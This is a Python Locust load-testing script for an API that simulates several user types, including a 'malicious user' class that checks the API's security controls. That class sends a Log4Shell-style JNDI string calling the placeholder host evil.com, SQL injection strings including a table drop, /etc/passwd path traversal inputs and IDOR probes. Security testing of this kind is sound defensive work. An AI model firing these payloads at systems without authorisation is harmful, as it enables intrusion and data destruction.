#!/usr/bin/env python3
"""
Locust Load Testing Script
Strategickhaos Sovereign Infrastructure Security Testing Suite

Distributed load testing with multiple user behavior patterns:
- Normal users (read-heavy)
- Power users (read/write balanced)
- Admin users (admin operations)
- Malicious users (attack patterns)
- API consumers (high-frequency)

Usage:
  locust -f locustfile.py --host=http://localhost:8000
  locust -f locustfile.py --host=http://localhost:8000 --headless -u 100 -r 10 -t 5m
"""

import json
import random
import string
import time
from datetime import datetime
from typing import Any, Dict, List, Optional

from locust import HttpUser, task, between, events, tag
from locust.runners import MasterRunner, WorkerRunner


# Configuration
class Config:
    """Load test configuration"""
    # User distribution weights
    USER_WEIGHTS = {
        "normal": 50,
        "power": 25,
        "admin": 10,
        "malicious": 5,
        "api_consumer": 10,
    }
    
    # Authentication
    AUTH_TOKEN = "test-auth-token"
    ADMIN_TOKEN = "admin-auth-token"
    
    # Rate limiting test
    RATE_LIMIT_THRESHOLD = 100  # requests per minute
    
    # Timeouts
    REQUEST_TIMEOUT = 30


def random_string(length: int = 10) -> str:
    """Generate random string for test data"""
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))


def random_email() -> str:
    """Generate random email"""
    return f"test_{random_string(8)}@example.com"


class BaseAPIUser(HttpUser):
    """Base class for API users with common functionality"""
    
    abstract = True
    wait_time = between(1, 3)
    
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.token = Config.AUTH_TOKEN
        self.user_id = f"user_{random_string(6)}"
        self.created_resources: List[str] = []
    
    def on_start(self):
        """Called when user starts"""
        self.login()
    
    def on_stop(self):
        """Called when user stops"""
        self.cleanup()
    
    def login(self):
        """Perform login and get auth token"""
        with self.client.post(
            "/api/v1/auth/login",
            json={"username": f"user_{self.user_id}", "password": "testpassword"},
            catch_response=True,
            name="Login"
        ) as response:
            if response.status_code == 200:
                try:
                    data = response.json()
                    self.token = data.get("access_token", self.token)
                    response.success()
                except json.JSONDecodeError:
                    response.success()  # Accept even without JSON response
            elif response.status_code in [401, 404]:
                response.success()  # Expected for test users
            else:
                response.failure(f"Login failed: {response.status_code}")
    
    def cleanup(self):
        """Clean up created resources"""
        for resource_id in self.created_resources:
            self.client.delete(
                f"/api/v1/resources/{resource_id}",
                headers=self.get_headers(),
                name="Cleanup Resource"
            )
    
    def get_headers(self) -> Dict[str, str]:
        """Get request headers with authentication"""
        return {
            "Authorization": f"Bearer {self.token}",
            "Content-Type": "application/json",
            "X-Request-ID": f"locust-{self.user_id}-{int(time.time())}",
        }


class NormalUser(BaseAPIUser):
    """
    Normal user behavior - read-heavy operations
    70% read, 20% write, 10% search
    """
    
    weight = Config.USER_WEIGHTS["normal"]
    
    @task(7)
    @tag("read")
    def list_resources(self):
        """List available resources"""
        with self.client.get(
            "/api/v1/resources",
            headers=self.get_headers(),
            catch_response=True,
            name="List Resources"
        ) as response:
            if response.status_code == 200:
                response.success()
            elif response.status_code == 401:
                response.success()  # Auth required but expected
            else:
                response.failure(f"Status: {response.status_code}")
    
    @task(5)
    @tag("read")
    def get_resource(self):
        """Get a specific resource"""
        resource_id = random.randint(1, 1000)
        with self.client.get(
            f"/api/v1/resources/{resource_id}",
            headers=self.get_headers(),
            catch_response=True,
            name="Get Resource"
        ) as response:
            if response.status_code in [200, 404]:
                response.success()
            else:
                response.failure(f"Status: {response.status_code}")
    
    @task(2)
    @tag("write")
    def create_resource(self):
        """Create a new resource"""
        with self.client.post(
            "/api/v1/resources",
            json={
                "name": f"resource_{random_string(8)}",
                "description": "Test resource created by Locust",
                "type": "test",
            },
            headers=self.get_headers(),
            catch_response=True,
            name="Create Resource"
        ) as response:
            if response.status_code in [200, 201]:
                try:
                    data = response.json()
                    if "id" in data:
                        self.created_resources.append(data["id"])
                except json.JSONDecodeError:
                    pass
                response.success()
            elif response.status_code in [401, 403]:
                response.success()  # Auth required
            else:
                response.failure(f"Status: {response.status_code}")
    
    @task(1)
    @tag("search")
    def search_resources(self):
        """Search for resources"""
        queries = ["test", "resource", "data", random_string(5)]
        query = random.choice(queries)
        with self.client.get(
            f"/api/v1/search?q={query}",
            headers=self.get_headers(),
            catch_response=True,
            name="Search Resources"
        ) as response:
            if response.status_code == 200:
                response.success()
            else:
                response.failure(f"Status: {response.status_code}")
    
    @task(1)
    @tag("health")
    def health_check(self):
        """Check API health"""
        with self.client.get(
            "/health",
            catch_response=True,
            name="Health Check"
        ) as response:
            if response.status_code == 200:
                response.success()
            else:
                response.failure(f"Health check failed: {response.status_code}")


class PowerUser(BaseAPIUser):
    """
    Power user behavior - balanced read/write
    40% read, 40% write, 20% complex operations
    """
    
    weight = Config.USER_WEIGHTS["power"]
    wait_time = between(0.5, 2)
    
    @task(4)
    @tag("read")
    def list_with_filters(self):
        """List resources with filters"""
        params = {
            "limit": random.choice([10, 20, 50]),
            "offset": random.randint(0, 100),
            "sort": random.choice(["created_at", "name", "updated_at"]),
        }
        self.client.get(
            "/api/v1/resources",
            params=params,
            headers=self.get_headers(),
            name="List Filtered"
        )
    
    @task(4)
    @tag("write")
    def create_and_update(self):
        """Create and then update a resource"""
        # Create
        create_response = self.client.post(
            "/api/v1/resources",
            json={
                "name": f"power_resource_{random_string(8)}",
                "description": "Power user resource",
                "type": "advanced",
                "metadata": {"created_by": "power_user"},
            },
            headers=self.get_headers(),
            name="Create for Update"
        )
        
        if create_response.status_code in [200, 201]:
            try:
                data = create_response.json()
                resource_id = data.get("id")
                if resource_id:
                    # Update
                    self.client.put(
                        f"/api/v1/resources/{resource_id}",
                        json={
                            "description": f"Updated at {datetime.now().isoformat()}",
                            "metadata": {"updated_by": "power_user"},
                        },
                        headers=self.get_headers(),
                        name="Update Resource"
                    )
            except json.JSONDecodeError:
                pass
    
    @task(2)
    @tag("complex")
    def batch_operation(self):
        """Perform batch operations"""
        items = [
            {"name": f"batch_{i}_{random_string(4)}", "type": "batch"}
            for i in range(random.randint(2, 5))
        ]
        self.client.post(
            "/api/v1/resources/batch",
            json={"items": items},
            headers=self.get_headers(),
            name="Batch Create"
        )
    
    @task(2)
    @tag("policy")
    def check_permissions(self):
        """Check authorization for various actions"""
        actions = ["read", "write", "delete", "admin"]
        self.client.post(
            "/api/v1/authorize",
            json={
                "user": {"id": self.user_id, "role": "user"},
                "action": random.choice(actions),
                "resource": {"type": "document", "id": str(random.randint(1, 100))},
            },
            headers=self.get_headers(),
            name="Check Permission"
        )


class AdminUser(BaseAPIUser):
    """
    Admin user behavior - administrative operations
    Focus on admin endpoints and user management
    """
    
    weight = Config.USER_WEIGHTS["admin"]
    wait_time = between(1, 5)
    
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.token = Config.ADMIN_TOKEN
    
    @task(3)
    @tag("admin")
    def list_users(self):
        """List all users (admin only)"""
        self.client.get(
            "/api/v1/admin/users",
            headers=self.get_headers(),
            name="Admin: List Users"
        )
    
    @task(2)
    @tag("admin")
    def view_audit_logs(self):
        """View audit logs"""
        self.client.get(
            "/api/v1/admin/audit",
            params={"limit": 50, "since": "2024-01-01T00:00:00Z"},
            headers=self.get_headers(),
            name="Admin: Audit Logs"
        )
    
    @task(2)
    @tag("admin")
    def system_stats(self):
        """Get system statistics"""
        self.client.get(
            "/api/v1/admin/stats",
            headers=self.get_headers(),
            name="Admin: System Stats"
        )
    
    @task(1)
    @tag("admin")
    def manage_settings(self):
        """View/update system settings"""
        # Get settings
        self.client.get(
            "/api/v1/admin/settings",
            headers=self.get_headers(),
            name="Admin: Get Settings"
        )
    
    @task(1)
    @tag("metrics")
    def get_metrics(self):
        """Get Prometheus metrics"""
        self.client.get(
            "/metrics",
            name="Metrics"
        )


class MaliciousUser(BaseAPIUser):
    """
    Malicious user behavior - attack simulation
    Tests security controls with various attack patterns
    """
    
    weight = Config.USER_WEIGHTS["malicious"]
    wait_time = between(0.1, 0.5)  # Fast attacks
    
    @task(3)
    @tag("attack", "auth")
    def auth_bypass_attempt(self):
        """Attempt authentication bypass"""
        bypass_tokens = [
            "",
            "null",
            "undefined",
            "Bearer ",
            "Bearer null",
            "Bearer ${jndi:ldap://evil.com}",
            "admin",
        ]
        
        headers = self.get_headers()
        headers["Authorization"] = random.choice(bypass_tokens)
        
        with self.client.get(
            "/api/v1/admin/users",
            headers=headers,
            catch_response=True,
            name="Attack: Auth Bypass"
        ) as response:
            # Should be denied
            if response.status_code in [401, 403]:
                response.success()
            elif response.status_code == 200:
                response.failure("Auth bypass succeeded!")
            else:
                response.success()
    
    @task(2)
    @tag("attack", "injection")
    def sql_injection_attempt(self):
        """Attempt SQL injection"""
        payloads = [
            "' OR '1'='1",
            "1; DROP TABLE users--",
            "admin'--",
            "1 UNION SELECT * FROM users--",
        ]
        
        payload = random.choice(payloads)
        
        with self.client.get(
            f"/api/v1/resources/{payload}",
            headers=self.get_headers(),
            catch_response=True,
            name="Attack: SQLi"
        ) as response:
            # Should be blocked or return safe error
            if response.status_code in [400, 404, 422]:
                response.success()
            elif "sql" in response.text.lower() or "error" in response.text.lower():
                response.failure("SQL error exposed!")
            else:
                response.success()
    
    @task(2)
    @tag("attack", "path_traversal")
    def path_traversal_attempt(self):
        """Attempt path traversal"""
        payloads = [
            "../../../etc/passwd",
            "....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f",
        ]
        
        payload = random.choice(payloads)
        
        with self.client.get(
            f"/api/v1/files/{payload}",
            headers=self.get_headers(),
            catch_response=True,
            name="Attack: Path Traversal"
        ) as response:
            if response.status_code in [400, 404, 403]:
                response.success()
            elif "root:" in response.text:
                response.failure("Path traversal succeeded!")
            else:
                response.success()
    
    @task(2)
    @tag("attack", "privilege_escalation")
    def privilege_escalation_attempt(self):
        """Attempt privilege escalation via IDOR"""
        # Try to access other users' resources
        for _ in range(3):
            user_id = random.randint(1, 100)
            with self.client.get(
                f"/api/v1/users/{user_id}/profile",
                headers=self.get_headers(),
                catch_response=True,
                name="Attack: IDOR"
            ) as response:
                if response.status_code in [401, 403, 404]:
                    response.success()
                elif response.status_code == 200:
                    # Check if we got another user's data
                    response.success()  # May be legitimate
                else:
                    response.success()
    
    @task(1)
    @tag("attack", "rate_limit")
    def rate_limit_test(self):
        """Test rate limiting by rapid requests"""
        for _ in range(10):
            self.client.get(
                "/api/v1/resources",
                headers=self.get_headers(),
                name="Attack: Rate Limit Test"
            )


class APIConsumer(BaseAPIUser):
    """
    API consumer behavior - high-frequency automated access
    Simulates external API integrations
    """
    
    weight = Config.USER_WEIGHTS["api_consumer"]
    wait_time = between(0.1, 0.5)  # High frequency
    
    @task(5)
    @tag("api")
    def fetch_data(self):
        """High-frequency data fetch"""
        self.client.get(
            "/api/v1/resources",
            params={"limit": 100},
            headers=self.get_headers(),
            name="API: Fetch Data"
        )
    
    @task(3)
    @tag("api")
    def webhook_simulation(self):
        """Simulate webhook calls"""
        self.client.post(
            "/api/v1/webhooks/receive",
            json={
                "event": "resource.updated",
                "timestamp": datetime.now().isoformat(),
                "data": {"id": random.randint(1, 1000)},
            },
            headers=self.get_headers(),
            name="API: Webhook"
        )
    
    @task(2)
    @tag("api", "policy")
    def bulk_authorization(self):
        """Check multiple authorizations"""
        requests = [
            {
                "user": {"id": f"user-{i}", "role": "user"},
                "action": "read",
                "resource": {"type": "document", "id": str(i)},
            }
            for i in range(random.randint(5, 10))
        ]
        
        self.client.post(
            "/api/v1/authorize/batch",
            json={"requests": requests},
            headers=self.get_headers(),
            name="API: Bulk Auth"
        )


# Event handlers
@events.test_start.add_listener
def on_test_start(environment, **kwargs):
    """Called when test starts"""
    if isinstance(environment.runner, MasterRunner):
        print("Load test starting on master node")
    else:
        print(f"Load test starting against {environment.host}")


@events.test_stop.add_listener
def on_test_stop(environment, **kwargs):
    """Called when test stops"""
    print("Load test completed")


@events.request.add_listener
def on_request(request_type, name, response_time, response_length, exception, **kwargs):
    """Called on each request"""
    if exception:
        # Log failed requests for debugging
        pass


# Custom web UI stats
@events.init.add_listener
def on_locust_init(environment, **kwargs):
    """Initialize custom stats"""
    if environment.web_ui:
        # Could add custom statistics here
        pass
